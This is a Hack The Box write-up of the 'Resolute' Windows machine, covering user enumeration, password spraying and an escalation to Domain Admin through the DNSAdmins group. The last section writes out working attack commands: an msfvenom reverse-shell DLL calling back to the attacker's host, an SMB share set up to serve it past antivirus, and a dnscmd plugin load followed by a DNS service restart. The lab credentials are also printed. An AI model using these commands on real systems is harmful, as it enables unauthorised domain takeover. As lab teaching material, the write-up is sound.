---
title: "Hack The Box - Resolute"
tags: [windows,medium,rpc,DNSAdmins Group]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled.png)

⇒ Resolute is an medium difficulty windows machine made by egre55 that teaches us :

- Enumerating users using rpc and password spraying
- Abusing DNSAdmins group for privilege escalation to Domain Admin

---

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%201.png)

---

### Enumerating and Password Spray

⇒ We ran enum4linux and got lots of username and found an password in an user description :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%202.png)

- The password doesnt work for user marko so we try the password for every other account and find that its the password for melanie :

**melanie : Welcome123!**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%203.png)

---

### Privilege Escalation to Ryan

⇒ So after enumerating files in the C:\ drive we discover an unusual directory named PSTranscripts

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%204.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%205.png)

- After reading the txt file we find credentials for user ryan :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%206.png)

**ryan : Serv3r4Admin4cc123**!

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%207.png)

---

### Privilege Escalation to Domain Administrator [ DNSAdmins Group ]

⇒ We see that user ryan is in DNSAdmins group. The following post explains how we can leverage this to escalate our privileges to Domain Administrator :

 [https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%208.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%209.png)

- First we'll generate the dll payload using msfvenom

**msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1234 --platform=windows -f dll > enox.dll**

- Starting up smbserver to host our **dll** so it doesnt get nuked by AV

**python3 [smbserver.py](http://smbserver.py/) -smb2support enox /home/kali/Desktop/HackTheBox/Machines/Resolute/**

- Next we will be importing the plugin to the server 

**dnscmd.exe /config /serverlevelplugindll \\10.10.14.21\enox\enox.dll**

- Now we just have to restart the dns service

    **sc.exe stop dns**

    **sc.exe start dns**

    ⇒ Then finally we get system

    ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Resolute%20Box%20017c2b66b1294bf79adf8be27e62c2ea/Untitled%2010.png)

    ---
